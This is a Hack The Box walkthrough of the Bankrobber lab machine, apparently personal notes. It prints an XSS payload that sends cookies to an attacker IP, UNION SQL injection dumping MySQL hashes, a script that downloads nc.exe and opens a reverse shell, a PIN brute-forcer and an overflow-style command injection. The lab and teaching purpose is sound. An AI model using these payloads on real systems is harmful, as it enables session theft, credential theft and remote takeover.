<img src="Pasted image 20240722181557.png" alt="HTB Profile Image" class="htb-profile-img">

<style>
  .htb-profile-img {
    width: 100%;
    max-width: 800px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.8); /* Initial glow effect */
    transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out; /* Smooth transition for glow and zoom effects */
  }

  .htb-profile-img:hover {
    box-shadow: 0 0 20px rgba(0, 255, 0, 1); /* Enhanced glow on hover */
    transform: scale(1.05); /* Zoom effect on hover */
  }
</style>

**Ping**
![[Pasted image 20240703133302.png]]

Nmap Scans 
```
mapit 10.10.10.154
```

Nmap Default Scan
![[Pasted image 20240703133354.png]]

Nmap Script and Service Scan
![[Pasted image 20240703133536.png]]
![[Pasted image 20240703133547.png]]

Nmap All Port Scan
![[Pasted image 20240703133833.png]]

On Port 80
![[Pasted image 20240703133933.png]]

Gobuster Scan
```
gobuster dir -u http://10.10.10.154 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,aspx -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt
```
![[Pasted image 20240703140124.png]]

On http://10.10.10.154/notes.txt
![[Pasted image 20240703134401.png]]

Registered user test:test@1234 and logged in
![[Pasted image 20240703134852.png]]

We can see the request when we transfer coin
![[Pasted image 20240703141301.png]]
There are three cookies, which id, username and password, all are base64 encoded.

Lets try to steal admin cookies, so will use the XSS script to do so
```
<script>var i=new Image(); i.src="http://10.10.14.3/?cookie="+btoa(document.cookie);</script>
```
I have used the the classic way if stealing cookies using this Link:https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e
I have just put the script in all parameters
![[Pasted image 20240703141717.png]]

And already started python webserver on Port 80
![[Pasted image 20240703141744.png]]
got it, will decode it
```
echo "dXNlcm5hbWU9WVdSdGFXNCUzRDsgcGFzc3dvcmQ9U0c5d1pXeGxjM055YjIxaGJuUnBZdyUzRCUzRDsgaWQ9MQ==" | base64 -d

echo "YWRtaW4=" | base64 -d

echo "SG9wZWxlc3Nyb21hbnRpYw==" | base64 -d
```
![[Pasted image 20240703142048.png]]
So it is **admin:Hopelessromantic** 

Will login as admin using admin cred
![[Pasted image 20240703142246.png]]
![[Pasted image 20240703142316.png]]

I think we can execute command here I guess
![[Pasted image 20240703142427.png]]

Mmmmm.....
![[Pasted image 20240703142502.png]]
but this didn't work

This looks Intresting, because it is beta, so it might contain some vuln
![[Pasted image 20240703142800.png]]

We can see there an another user gio with id 2
![[Pasted image 20240703142835.png]]

Got it, this is vulnerable to sql injection
![[Pasted image 20240703142916.png]]



Will Jump to Initial Foothold....!


We have two database here
![[Pasted image 20240703143029.png]]
User and ID

Burp Request/Response
![[Pasted image 20240703143209.png]]

Will find No.of columns using Union injection 
```
4' UNION SELECT 1,2,3;
```
This worked, there are 3 columns
![[Pasted image 20240703151851.png]]

Will get the content of Username and Password
```
4' UNION SELECT user,password,3 from mysql.user;
```
![[Pasted image 20240703152710.png]]
Got Root hash

Cracked it
![[Pasted image 20240703152824.png]]

But unable to to log in
```
mysql -h 10.10.10.154 -u root -pWelkom1!
```
![[Pasted image 20240703153021.png]]


Refer this link:https://0xdf.gitlab.io/2020/03/07/htb-bankrobber.html
```
<script src="http://10.10.14.3/rev1.js"></script>
```
![[Pasted image 20240703162743.png]]
![[Pasted image 20240703162727.png]]
rev1.js
```
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://localhost/admin/backdoorchecker.php", true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('cmd=dir|powershell -c "Invoke-WebRequest -Uri http://10.10.14.3/nc.exe -OutFile %temp%\\nc.exe"; %temp%\\nc.exe -e cmd.exe 10.10.14.3 443');
```

**user.txt**
![[Pasted image 20240703162940.png]]



So We can see the service running on the machine
![[Pasted image 20240703170018.png]]

Also Found its Pid
```
tasklist
```
![[Pasted image 20240703170056.png]]

Checking Listening ports
```
netstat -ano | findstr LISTENING
```
![[Pasted image 20240703170212.png]]
Can see bankv2.exe is listening on port 910

Will loop back this to our kali machine using plink.exe
```
./plink.exe -l kali -pw kali 10.10.14.3 -R 910:127.0.0.1:910 -P 2222
```
![[Pasted image 20240703170344.png]]

Now we can access the port 910 from our kali machine
```
 nc -v 127.0.0.1 910
```
![[Pasted image 20240703170429.png]]

But it is asking 4 digit Pin code, will create a python script which brute force the combinations
```
import socket
from tqdm import tqdm

def brute_force_pin(host, port):
    # Show the initial received banner once
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((host, port))
            initial_banner = s.recv(1024).decode()
            print(f"Received: {initial_banner.strip()}")
        except Exception as e:
            print(f"Error: {e}")
            return
    
    # Iterate through all possible 4-digit PINs
    for pin in tqdm(range(10000), desc="Brute-forcing PIN", unit="pin"):
        pin_str = f"{pin:04}"  # Format the PIN as a 4-digit string

        # Create a socket connection for each attempt
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.connect((host, port))
                s.recv(1024)  # Receive the initial banner or prompt again (ignored)
                s.sendall((pin_str + "\n").encode())  # Send the PIN
                response = s.recv(1024).decode()  # Receive the response

                # Check if the response indicates a successful login
                if "Access denied" not in response:
                    print(f"[!] Access granted with PIN: {pin_str}")
                    break
            except Exception as e:
                continue

if __name__ == "__main__":
    host = "127.0.0.1"
    port = 910
    brute_force_pin(host, port)
```
Save it and execute it

```
python3 brute.py
```
![[Pasted image 20240703171349.png]]
Found the valid cred is **0021**

I tested the service by sending 1000 bitcoins
![[Pasted image 20240703172303.png]]

Now instead numerical values, will send some strings
![[Pasted image 20240703172402.png]]
Great, it is just executing the string, will use this to  get a shell as admin

I already transferred the nc.exe to the target and it is in C:\\users\\public directory
![[Pasted image 20240703172548.png]]

Will use this to get a shell as admin, I have tried this straight command, it is taking the string after 32 bit.
```
C:\\users\\public\\nc.exe -e cmd.exe 10.10.14.3 443
```
![[Pasted image 20240703172706.png]]
We can see that till **C:\\users\\public\\nc.exe -e cmd** is 32 bit including spaces, so will fill first 32 bit with random string and try it again.

Will first first 32 bit in pwn
```
pwnpwnpwnpwnpwnpwnpwnpwnpwnpwnpwC:\\users\\public\\nc.exe -e cmd.exe 10.10.14.3 443
```
![[Pasted image 20240703173308.png]]
This worked as expected

Got shell as admin
![[Pasted image 20240703173331.png]]

**Root.txt**
![[Pasted image 20240703173455.png]]



Done with Bankrobber........:)
